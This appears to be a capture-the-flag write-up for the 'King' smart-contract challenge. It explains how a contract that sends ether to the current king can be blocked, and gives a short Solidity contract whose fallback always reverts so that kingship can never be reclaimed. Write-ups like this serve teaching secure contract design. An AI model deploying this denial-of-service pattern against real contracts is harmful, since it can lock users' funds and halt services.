# King

This challenge is about how bad contracts can abuse withdrawals.

Whoever is able to send more than _1 ether_ to the ```King``` contract becomes the **King** but there's a catch.

The amount of ether that has to be larger than the current prize to become the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. The goal is to break it.

When a submission is made to the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

## What's the catch

Specifically, every smart contract can have a simple Fallback function in order to receive Ethers from other contracts and wallets.

Each time a contract sends Ethers to another contract, the contract - sender - are depending on the other contract’s code to handle the transaction and determine the transaction’s success, which means valid transactions could _Fail_.

As the transaction sender, you are always susceptible to the following cases:

- Loophole 1: The receiving contract doesn’t have a payable fallback function, cannot receive Ethers, and will throw an error upon a payable request.

- Loophole 2: The receiving contract has a malicious payable fallback function that throws an exception and fails valid transactions.

- Loophole 3: The receiving contract has a malicious payable function that consumes a large amount of gas, which fails your transaction or over-consumes your gas limit.

## Way out

I implemented a malicious fallback fucntion in a new contract as below:

```solidity
contract MadKing {
  function kingOfKings(address addr) public payable {
    (bool result, bytes memory data) = addr.call{value:msg.value}("");
    if(!result) revert("The kingOfKings function reverted");
  }

  fallback() external payable {  // fallback function that will revert everytime.
      revert("look at me I'm the captain now");
  }
}

```

After deploying the contact, the malicious fallback ```kingOfKings(address myLevelInstance)``` is called with _1 ether_ sent.

This helps make me the **King**, which of course...I am 😎!!!

On to the next.
